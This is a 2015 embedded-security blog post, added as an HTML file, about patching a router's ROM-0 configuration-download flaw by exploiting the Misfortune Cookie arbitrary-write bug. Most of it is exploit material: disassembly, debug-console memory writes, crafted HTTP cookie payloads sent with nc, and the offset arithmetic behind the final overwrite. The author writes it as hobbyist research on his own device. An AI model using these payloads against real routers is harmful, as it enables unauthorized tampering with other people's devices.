@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Patching ROM-0 Bug With Misfortune Cookie</title>
+    <meta name="description" content="">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="/css/screen.css">
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400">
+
+    <link rel="canonical" href="">
+
+    <style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style>
+</head>
+
+<body class="home-template">
+    <header class="main-header post-head no-cover">
+    <nav class="main-nav clearfix">
+        <a class="back-button icon-arrow-left" href="http://embedsec.systems">Home</a>
+        
+    </nav>
+</header>
+
+    <main class="content" role="main">
+    <article class="post">
+
+        <header class="post-header">
+            <h1 class="post-title">Patching ROM-0 Bug With Misfortune Cookie</h1>
+            <section class="post-meta">
+                <a>cawan</a>
+                <time class="post-date" datetime="2015-03-03">03 March 2015</time>
+                <a href="mailto:cawan@ieee.org">cawan@ieee.org</a>
+            </section>
+        </header>
+
+        <section class="post-content">
+            <p>This is a paper just for fun, especially for those embedded hackers who looking
+for fun in tweaking embedded system. So, this is not the proper solution to fix
+ROM-0 bug, it is ridiculous to fix a bug with another bug. Anyway, let’s start
+our fun now. From my previous paper of “Misfortune Cookie Demystified”, it is
+clear we can perform arbitrary address overwrite with arbitrary data. Other than
+to unlock a router, it is possible to patch a router in order to fix ROM-0 bug.
+Before that, let us have a look to the data format of overwriting action being
+executed by misfortune cookie in detail. Back to the code snippet.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">ROM:8010E5B0 loc_8010E5B0:                            # CODE XREF: sub_8010E574+EC j
+ROM:8010E5B0                 li      $t7, 0x43        # 0x43=&#39;C&#39;
+ROM:8010E5B4                 bne     $v0, $t7, loc_8010E618
+ROM:8010E5B8                 li      $a1, 0x3D
+ROM:8010E5BC                 addiu   $s0, 1
+ROM:8010E5C0                 move    $a0, $s0       
+ROM:8010E5C4                 jal     sub_8016C340
+ROM:8010E5C8                 nop
+ROM:8010E5CC                 move    $a0, $s0       
+ROM:8010E5D0                 move    $s1, $v0       
+ROM:8010E5D4                 addiu   $s1, 1
+ROM:8010E5D8                 jal     sub_801F2E74
+ROM:8010E5DC                 sb      $zero, -1($s1) 
+ROM:8010E5E0                 move    $a0, $s1       
+ROM:8010E5E4                 jal     sub_8016CA24
+ROM:8010E5E8                 move    $s3, $v0       
+ROM:8010E5EC                 li      $a2, 0x28
+ROM:8010E5F0                 mul     $t2, $s3, $a2   
+ROM:8010E5F4                 move    $a1, $s1       
+ROM:8010E5F8                 addiu   $t5, $s4, 0x6B28
+ROM:8010E5FC                 move    $s0, $v0
+ROM:8010E600                 addu    $at, $s1, $s0   
+ROM:8010E604                 addu    $a0, $t5, $t2   
+ROM:8010E608                 jal     sub_8016A784
+ROM:8010E60C                 sb      $zero, 0($at)
+ROM:8010E610                 j       loc_8010E644   
+ROM:8010E614                 addu    $s0, $s1, $s0
+ROM:8010E618  # ---------------------------------------------------------------------------</code></pre></div>
+
+<p>ROM:8010E608 is strncpy(), after it, at ROM:8010E610 and ROM:8010E614, we just simply
+set a trap there. Well, we make it this way,</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">RAS Version: 1.0.0 Build 121121 Rel.08870 
+System   ID: $2.12.58.23(G04.BZ.4)3.20.7.0 20120518_V003  | 2012/05/18 
+
+Press any key to enter debug mode within 3 seconds.
+...
+Enter Debug Mode
+ATEN1, A847D6B1
+OK
+ATWL 80014BC0, ac30fffc
+OK
+ATGR
+     (Compressed)
+     Version: FDATA, start: bfc85830
+     Length: A94C, Checksum: DCEE
+     Compressed Length: 1D79, Checksum: 01BB
+Flash data is the same!!
+     (Compressed)
+     Version: ADSL ATU-R, start: bfc95830
+     Length: 3E7004, Checksum: 3336
+     Compressed Length: 122D57, Checksum: 3612
+
+ERROR
+ATWL 8010E610, 0280b820
+OK
+ATWL 8010E614, 00000008
+OK
+ATGO 80020000
+OK
+...
+...
+writeRomBlock(): Erase OK!
+istributePvcFakeMac!
+run distributePvcFakeMac!
+run distributePvcFakeMac!
+run distributePvcFakeMac!
+run distributePvcFakeMac!
+run distributePvcFakeMac!
+Press ENTER to continue...</code></pre></div>
+
+<p>Now, it is ready to trigger the trap.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">cawan$ cat cawan_header | xxd
+0000000: 4745 5420 2f20 4854 5450 2f31 2e31 0a55  GET / HTTP/1.1.U
+0000010: 7365 722d 4167 656e 743a 2063 7572 6c2f  ser-Agent: curl/
+0000020: 372e 3333 2e30 0a48 6f73 743a 2031 3932  7.33.0.Host: 192
+0000030: 2e31 3638 2e31 2e31 0a41 6363 6570 743a  .168.1.1.Accept:
+0000040: 202a 2f2a 0a43 6f6f 6b69 653a 2043 3130   */*.Cookie: C10
+0000050: 3733 3733 3838 333d 6161 0a                       7373883=aa.
+cawan$ cat cawan_header | nc 192.168.1.1 80
+cawan$</code></pre></div>
+
+<p>and we get this,</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">TLB refill exception occured!
+EPC= 0x00000000
+SR= 0x10000003
+CR= 0x50805008
+$RA= 0x80020000
+Bad Virtual Address = 0x00000000
+UTLB_TLBL ..\core\sys_isr.c:267 sysreset()
+
+
+        $r0= 0x00000000 $at= 0x80350000 $v0= 0x00000000 $v1= 0x00000001
+        $a0= 0x00000001 $a1= 0x805D7AF8 $a2= 0xFFFFFFFF $a3= 0x00000000
+        $t0= 0x8001FF80 $t1= 0xFFFFFFFE $t2= 0x804A8F38 $t3= 0x804A9E47
+        $t4= 0x804A9460 $t5= 0x804A8A60 $t6= 0x804A9D00 $t7= 0x00000040
+        $s0= 0x804A8A60 $s1= 0x8040C114 $s2= 0x805E2BC8 $s3= 0x80042A70
+        $s4= 0x00000001 $s5= 0x8000007C $s6= 0x8040E5FC $s7= 0x8040F8AC
+        $t8= 0x804A9E48 $t9= 0x00000000 $k0= 0x00000000 $k1= 0x8000007C
+        $gp= 0x8040F004 $sp= 0x805E2B60 $fp= 0x805E2BC8 $ra= 0x8003A3D0
+
+...
+...</code></pre></div>
+
+<p>Let us find a nice looking buffer area to start our study of data overwriting
+format and pattern in detail. It seems 0x804ED500 is a good place, as shown
+below.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">Press any key to enter debug mode within 3 seconds.
+......
+Enter Debug Mode
+atdu 804ed500
+804ED500: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED510: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED520: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED530: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED540: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED550: 00 00 00 00 80 4E DD 68-80 10 39 90 02 0C 0B 00   .....N.h..9.....
+804ED560: BE AF 00 00 00 00 08 00-47 45 54 20 2F 00 48 54   ........GET /.HT
+804ED570: 54 50 2F 31 2E 31 0A 75-73 65 72 2D 61 67 65 6E   TP/1.1.user-agen
+804ED580: 74 3A 20 63 75 72 6C 2F-37 2E 33 33 2E 30 0A 68   t: curl/7.33.0.h
+804ED590: 6F 73 74 3A 20 31 39 32-2E 31 36 38 2E 31 2E 31   ost: 192.168.1.1
+804ED5A0: 00 61 63 63 65 70 74 3A-20 2A 2F 2A 0A 63 6F 6F   .accept: */*.coo
+804ED5B0: 6B 69 65 3A 20 43 31 30-37 33 37 33 38 38 33 00   kie: C107373883.
+804ED5C0: 61 61 00 00 00 00 00 00-00 00 00 00 00 00 00 00   aa..............
+804ED5D0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED5E0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED5F0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+
+OK</code></pre></div>
+
+<p>From 0x804ED570 to 0x804ED5B0, there is no null character being existed in that
+portion of data. On the other hand, 0x804ED400 is another good place, as shown
+below.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">atdu 804ed400
+804ED400: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED410: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED420: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED430: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED440: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED450: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED460: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED470: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED480: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED490: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4A0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4B0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4C0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4D0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4E0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4F0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+
+OK</code></pre></div>
+
+<p>Well, there is all null characters in this portion of memory. Now, let us put
+some data in this all null portion.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">ATEN1, A847D6B1
+OK
+ATWL 80014BC0, ac30fffc
+OK
+ATGR
+     (Compressed)
+     Version: FDATA, start: bfc85830
+     Length: A94C, Checksum: DCEE
+     Compressed Length: 1D79, Checksum: 01BB
+Flash data is the same!!
+     (Compressed)
+     Version: ADSL ATU-R, start: bfc95830
+     Length: 3E7004, Checksum: 3336
+     Compressed Length: 122D57, Checksum: 3612
+
+ERROR
+ATWL 8010E610, 0280b820
+OK
+ATWL 8010E614, 00000008
+OK
+ATGO 80020000
+OK
+...
+...</code></pre></div>
+
+<p>According to Piotrbania [1], there is a “god mode” which should be triggered
+to enable hidden commands. The hidden commands will allow us to view memory
+mapping and to edit memory contents, as shown below,</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">cawan$ cat cawan_header | xxd
+0000000: 4745 5420 2f20 4854 5450 2f31 2e31 0a55  GET / HTTP/1.1.U
+0000010: 7365 722d 4167 656e 743a 2063 7572 6c2f  ser-Agent: curl/
+0000020: 372e 3333 2e30 0a48 6f73 743a 2031 3932  7.33.0.Host: 192
+0000030: 2e31 3638 2e31 2e31 0a41 6363 6570 743a  .168.1.1.Accept:
+0000040: 202a 2f2a 0a43 6f6f 6b69 653a 2043 3232   */*.Cookie: C22
+0000050: 3032 323d 6361 7761 6e0a                            022=cawan.
+cawan$ cat cawan_header | nc 192.168.1.1 80
+cawan$</code></pre></div>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">RAS Version: 1.0.0 Build 121121 Rel.08870 
+System   ID: $2.12.58.23(G04.BZ.4)3.20.7.0 20120518_V003  | 2012/05/18 
+
+Press any key to enter debug mode within 3 seconds.
+.......
+Enter Debug Mode
+atdu 804ed400
+804ED400: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED410: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED420: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED430: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED440: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED450: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED460: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED470: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED480: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED490: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4A0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4B0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4C0: 00 00 00 00 63 61 77 61-6E 00 00 00 00 00 00 00   ....cawan.......
+804ED4D0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4E0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED4F0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+
+OK</code></pre></div>
+
+<p>Cool, the string “cawan” is there. Then, we try to put it into the portion between
+0x804ED570 and 0x804ED5B0.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">ATEN1, A847D6B1
+OK
+ATWL 80014BC0, ac30fffc
+OK
+ATGR
+     (Compressed)
+     Version: FDATA, start: bfc85830
+     Length: A94C, Checksum: DCEE
+     Compressed Length: 1D79, Checksum: 01BB
+Flash data is the same!!
+     (Compressed)
+     Version: ADSL ATU-R, start: bfc95830
+     Length: 3E7004, Checksum: 3336
+     Compressed Length: 122D57, Checksum: 3612
+
+ERROR
+ATWL 8010E610, 0280b820
+OK
+ATWL 8010E614, 00000008
+OK
+ATGO 80020000
+OK
+...
+...</code></pre></div>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">cawan$ cat cawan_header | xxd
+0000000: 4745 5420 2f20 4854 5450 2f31 2e31 0a55  GET / HTTP/1.1.U
+0000010: 7365 722d 4167 656e 743a 2063 7572 6c2f  ser-Agent: curl/
+0000020: 372e 3333 2e30 0a48 6f73 743a 2031 3932  7.33.0.Host: 192
+0000030: 2e31 3638 2e31 2e31 0a41 6363 6570 743a  .168.1.1.Accept:
+0000040: 202a 2f2a 0a43 6f6f 6b69 653a 2043 3232   */*.Cookie: C22
+0000050: 3032 373d 6361 7761 6e0a                            027=cawan.
+cawan$ cat cawan_header | nc 192.168.1.1 80
+cawan$</code></pre></div>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">Press any key to enter debug mode within 3 seconds.
+......
+Enter Debug Mode
+atdu 804ed500
+804ED500: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED510: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED520: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED530: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED540: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED550: 00 00 00 00 80 4E DD 68-80 10 39 90 02 0C 0B 00   .....N.h..9.....
+804ED560: BE AF 00 00 00 00 08 00-47 45 54 20 2F 00 48 54   ........GET /.HT
+804ED570: 54 50 2F 31 2E 31 0A 75-73 65 72 2D 61 67 65 6E   TP/1.1.user-agen
+804ED580: 74 3A 20 63 75 72 6C 2F-37 2E 33 33 63 61 77 61   t: curl/7.33cawa
+804ED590: 6E 00 74 3A 20 31 39 32-2E 31 36 38 2E 31 2E 31   n.t: 192.168.1.1
+804ED5A0: 00 61 63 63 65 70 74 3A-20 2A 2F 2A 0A 63 6F 6F   .accept: */*.coo
+804ED5B0: 6B 69 65 3A 20 43 32 32-30 32 37 00 63 61 77 61   kie: C22027.cawa
+804ED5C0: 6E 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   n...............
+804ED5D0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED5E0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+804ED5F0: 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
+
+OK</code></pre></div>
+
+<p>Well, it is clear that for whatever string that we send will be padded by a null
+character. Now, we can create a nop instruction where the last byte is 0x00. It
+is simple, we choose</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">lui $s7,0x4100</code></pre></div>
+
+<p>which its hex is 0x3C174100. So, we have to find out which location that we need
+to patch now. After having some study with IDA, it seems</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">ROM:80102A40   jal sub_8003D630</code></pre></div>
+
+<p>is the correct place. Let’s try it.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">ATEN1, A847D6B1
+OK
+ATWL 80014BC0, ac30fffc
+OK
+ATGR
+     (Compressed)
+     Version: FDATA, start: bfc85830
+     Length: A94C, Checksum: DCEE
+     Compressed Length: 1D79, Checksum: 01BB
+Flash data is the same!!
+     (Compressed)
+     Version: ADSL ATU-R, start: bfc95830
+     Length: 3E7004, Checksum: 3336
+     Compressed Length: 122D57, Checksum: 3612
+
+ERROR
+ATWL 80102a40,00000000
+OK
+atgo 80020000
+OK
+..
+..</code></pre></div>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">cawan$ wget 192.168.1.1/rom-0
+--2015-03-03 03:07:26--  http://192.168.1.1/rom-0
+Connecting to 192.168.1.1:80... connected.
+HTTP request sent, awaiting response... 404 Not Found
+2015-03-03 03:07:26 ERROR 404: Not Found.
+cawan$</code></pre></div>
+
+<p>Well, we are at the right place. Now, we have to calculate the address to be used
+by the misfortune cookie bug.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">0x80102A40 - 0x804163D4 = 0xFFCEC66C                (Do it in Dword)
+
+0xFFCEC66C % 0x28 = 0xC              (Do it in Qword)</code></pre></div>
+
+<p>Unfortunately, 0x80102A40 is not exactly aligned to the 0x28. So we should adjust
+the address to make it properly aligned. We try again.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">0x80102A34 - 0x804163D4 = 0xFFCEC660                (Do it in Dword)
+
+0xFFCEC660 % 0x28 = 0x0             (Do it in Qword)</code></pre></div>
+
+<p>Nice, it is 0x28 aligned now, so we can proceed to calculate the address.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">0xFFCEC660 / 0x28 = 0x6652B5C     (Do it in Qword)
+
+0x6652B5C = 107293532</code></pre></div>
+
+<p>It is ready to create our payload now. Let’s boot the router in normal and test
+our payload. Remember our nop instruction ? :) Before trigger our payload, lets
+verify the rom-0 bug is there.</p>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">cawan$ wget 192.168.1.1/rom-0
+--2015-03-03 03:29:11--  http://192.168.1.1/rom-0
+Connecting to 192.168.1.1:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16384 (16K) [application/octet-stream]
+Saving to: ‘rom-0’
+
+100%[=======================================================================
+=========================&gt;] 16,384      14.9KB/s   in 1.1s 
+
+Last-modified header invalid -- time-stamp ignored.
+2015-03-03 03:29:12 (14.9 KB/s) - ‘rom-0’ saved [16384/16384]</code></pre></div>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">cawan$ cat cawan_header | xxd
+0000000: 4745 5420 2f20 4854 5450 2f31 2e31 0a55  GET / HTTP/1.1.U
+0000010: 7365 722d 4167 656e 743a 2063 7572 6c2f  ser-Agent: curl/
+0000020: 372e 3333 2e30 0a48 6f73 743a 2031 3932  7.33.0.Host: 192
+0000030: 2e31 3638 2e31 2e31 0a41 6363 6570 743a  .168.1.1.Accept:
+0000040: 202a 2f2a 0a43 6f6f 6b69 653a 2043 3130   */*.Cookie: C10
+0000050: 3732 3933 3533 323d 4141 4141 4141 4141  7293532=AAAAAAAA
+0000060: 4141 4141 3c17 410a                                      AAAA<span class="nt">&lt;.A.</span></code></pre></div>
+
+<div class="highlight"><pre><code class="language-html" data-lang="html">cawan$ wget 192.168.1.1/rom-0
+--2015-03-03 03:40:32--  http://192.168.1.1/rom-0
+Connecting to 192.168.1.1:80... connected.
+HTTP request sent, awaiting response... 404 Not Found
+2015-03-03 03:40:32 ERROR 404: Not Found.</code></pre></div>
+
+<p>Excellent, we are done, and we conclude our fun here. :)</p>
+
+<p>PDF Version:</p>
+
+<p><a href="https://www.scribd.com/doc/257435787/Patching-ROM-0-Bug-With-Misfortune-Cookie">https://www.scribd.com/doc/257435787/Patching-ROM-0-Bug-With-Misfortune-Cookie</a></p>
+
+        </section>
+    </article>
+</main>
+
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="https://github.com/TryGhost/Casper">Ghost Foundation</a> © 2015 <a class="icon-twitter" href="https://twitter.com/embedsec"></a> <a class="icon-feed" href="http://embedsec.systems/feed.xml"></a></section>
+</footer>
+
+    <script src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+
+</body>
+</html>
